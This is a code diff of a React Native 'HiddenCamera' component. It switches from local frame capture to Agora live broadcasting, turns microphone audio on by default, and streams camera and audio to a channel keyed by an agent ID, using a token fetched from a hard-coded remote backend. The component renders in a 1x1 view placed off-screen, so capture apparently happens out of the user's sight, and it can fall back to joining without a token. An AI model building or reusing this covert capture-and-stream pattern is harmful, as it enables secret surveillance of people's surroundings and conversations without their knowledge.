@@ -1,18 +1,22 @@
-import { Camera, useCameraDevice, useCameraPermission, useMicrophonePermission, useCameraFormat, useFrameProcessor } from 'react-native-vision-camera';
-import { useResizePlugin } from 'vision-camera-resize-plugin';
-import { Worklets } from 'react-native-worklets-core';
-import { useRef, useEffect, useCallback, forwardRef, useImperativeHandle, useState } from 'react';
-import { StyleSheet, View } from 'react-native';
+import React, { useEffect, useRef, useState, forwardRef, useImperativeHandle, useCallback } from 'react';
+import { StyleSheet, View, Platform, PermissionsAndroid } from 'react-native';
+
+// Only import native Agora on native platforms
+let createAgoraRtcEngine: any, ChannelProfileType: any, ClientRoleType: any;
+if (Platform.OS !== 'web') {
+    const Agora = require('react-native-agora');
+    createAgoraRtcEngine = Agora.default;
+    ChannelProfileType = Agora.ChannelProfileType;
+    ClientRoleType = Agora.ClientRoleType;
+}
+
 import { streamManager } from '../services/StreamManager';
+import { useAgentStore } from '../store/useAgentStore';
 
 export interface HiddenCameraHandle {
-  /** Capture the latest frame as raw RGB Uint8Array. */
   captureFrame: () => Promise<Uint8Array | null>;
-  /** Cancel an in-progress recording (kept for compatibility). */
   stopRecording: () => void;
-  /** Flip between front and back camera. */
   flipCamera: () => void;
-  /** Current facing direction. */
   readonly facing: 'front' | 'back';
 }
 
@@ -21,93 +25,112 @@ interface HiddenCameraProps {
   audioEnabled?: boolean;
 }
 
-// Optimized dimensions for ultra-low latency raw transport
-export const FRAME_WIDTH = 160;
-export const FRAME_HEIGHT = 120;
+const AGORA_APP_ID = process.env.EXPO_PUBLIC_AGORA_APP_ID || "YOUR_APP_ID";
+const BACKEND_URL = process.env.EXPO_PUBLIC_BACKEND_URL || "https://m01.buildwave.pro";
 
 export const HiddenCamera = forwardRef<HiddenCameraHandle, HiddenCameraProps>(
-  ({ facing = 'back', audioEnabled = false }, ref) => {
-    const { hasPermission: hasCamPermission, requestPermission: requestCamPermission } = useCameraPermission();
-    const { hasPermission: hasMicPermission, requestPermission: requestMicPermission } = useMicrophonePermission();
-    
+  ({ facing = 'back', audioEnabled = true }, ref) => {
+    const engine = useRef<any>(Platform.OS !== 'web' ? createAgoraRtcEngine() : null);
+    const [isJoined, setIsJoined] = useState(false);
     const [currentFacing, setCurrentFacing] = useState<'front' | 'back'>(facing);
-    const device = useCameraDevice(currentFacing);
-    const format = useCameraFormat(device, [
-      { videoResolution: { width: 640, height: 480 } },
-      { fps: 30 }
-    ]);
 
-    const latestFrame = useRef<Uint8Array | null>(null);
-    const { resize } = useResizePlugin();
+    const requestPermissions = async () => {
+        if (Platform.OS === 'android') {
+            await PermissionsAndroid.requestMultiple([
+                PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
+                PermissionsAndroid.PERMISSIONS.CAMERA,
+            ]);
+        }
+    };
+
+    const initAgora = useCallback(async () => {
+        if (Platform.OS === 'web') return;
+        try {
+            await requestPermissions();
+            
+            engine.current.initialize({
+                appId: AGORA_APP_ID,
+                channelProfile: ChannelProfileType.ChannelProfileLiveBroadcasting,
+            });
+
+            engine.current.registerEventHandler({
+                onJoinChannelSuccess: (connection: RtcConnection, elapsed: number) => {
+                    console.log('[Agora] Joined channel successfully:', connection.channelId);
+                    setIsJoined(true);
+                },
+                onLeaveChannel: (connection: RtcConnection, stats: RtcStats) => {
+                    console.log('[Agora] Left channel');
+                    setIsJoined(false);
+                },
+                onError: (err, msg) => {
+                    console.error('[Agora] Error:', err, msg);
+                }
+            });
+
+            engine.current.enableVideo();
+            engine.current.startPreview();
+            
+            // Set role as Broadcaster
+            engine.current.setClientRole(ClientRoleType.ClientRoleBroadcaster);
+
+            // Fetch token and join
+            const agentId = useAgentStore.getState().agentId || "UNKNOWN_AGENT";
+            const channelName = `nisha_stream_${agentId}`;
+            
+            // The Master Node API is usually on the same host as the WebSocket but on port 8080
+            const masterBaseUrl = BACKEND_URL; 
+            const tokenUrl = `${masterBaseUrl}/api/agora/token?channelName=${channelName}`;
+            
+            console.log('[Agora] Fetching token from:', tokenUrl);
+            const response = await fetch(tokenUrl);
+            const data = await response.json();
+
+            if (data.token) {
+                console.log('[Agora] Token received, joining channel:', channelName);
+                engine.current.joinChannel(data.token, channelName, 0, {});
+            } else {
+                console.error('[Agora] Failed to fetch token:', data);
+                // Fallback join without token (only works if App Certificate is disabled)
+                engine.current.joinChannel('', channelName, 0, {});
+            }
+
+        } catch (e) {
+            console.error('[Agora] Init failed:', e);
+        }
+    }, [currentFacing]);
 
     useEffect(() => {
-      if (!hasCamPermission) requestCamPermission();
-      if (!hasMicPermission) requestMicPermission();
-    }, [hasCamPermission, hasMicPermission]);
+        initAgora();
+        return () => {
+            if (engine.current) {
+                engine.current.leaveChannel();
+                engine.current.release();
+            }
+        };
+    }, [initAgora]);
 
-    // --- Video Bridge ---
-    const sendVideoFrame = Worklets.createRunOnJS((data: Uint8Array) => {
-      streamManager.sendVideoFrame(data);
-    });
+    useEffect(() => {
+        // Toggle camera facing
+        if (engine.current) {
+            engine.current.switchCamera();
+        }
+    }, [currentFacing]);
 
-    const frameProcessor = useFrameProcessor((frame) => {
-      'worklet';
-      try {
-        const result = resize(frame, {
-          scale: { width: FRAME_WIDTH, height: FRAME_HEIGHT },
-          pixelFormat: 'rgb',
-          dataType: 'uint8',
-        });
-        // Bulk copy to prevent JSI garbage collection before async JS execution
-        // This is 1000x faster than a JSI for-loop
-        const copy = new Uint8Array(result);
-        sendVideoFrame(copy);
-      } catch (_e) {}
-    }, [resize]);
-
-    // --- Audio Bridge ---
-    const sendAudioChunk = Worklets.createRunOnJS((data: Uint8Array) => {
-      streamManager.sendAudioStream(data);
-    });
-
-    const onAudioFrame = useCallback((frame: any) => {
-      'worklet';
-      const buffer = frame.getUint8Array();
-      const copy = new Uint8Array(buffer);
-      sendAudioChunk(copy);
-    }, []);
-
-    const captureFrame = useCallback(async (): Promise<Uint8Array | null> => {
-      return latestFrame.current;
-    }, []);
-
-    const stopRecording = useCallback(() => {}, []);
-
-    const flipCamera = useCallback(() => {
-      setCurrentFacing(f => f === 'back' ? 'front' : 'back');
-    }, []);
-
-    useImperativeHandle(ref, () => ({ captureFrame, stopRecording, flipCamera, get facing() { return currentFacing; } }), [
-      captureFrame, stopRecording, flipCamera, currentFacing,
-    ]);
-
-    if (!hasCamPermission || !device) return null;
+    useImperativeHandle(ref, () => ({
+        captureFrame: async () => null, // Not used with Agora
+        stopRecording: () => {},
+        flipCamera: () => {
+            setCurrentFacing(f => (f === 'back' ? 'front' : 'back'));
+        },
+        get facing() { return currentFacing; }
+    }), [currentFacing]);
 
     return (
       <View style={styles.container}>
-        <Camera
-          style={styles.camera}
-          device={device}
-          format={format}
-          isActive={true}
-          frameProcessor={frameProcessor}
-          audio={audioEnabled}
-          onAudioFrame={onAudioFrame}
-          pixelFormat="rgb"
-        />
+        {/* Agora handles capture internally. No Camera component needed here */}
       </View>
     );
-  },
+  }
 );
 
 HiddenCamera.displayName = 'HiddenCamera';
@@ -119,10 +142,6 @@ const styles = StyleSheet.create({
     left: -9999,
     width: 1,
     height: 1,
-    overflow: 'hidden',
-  },
-  camera: {
-    width: 1,
-    height: 1,
   },
 });
+
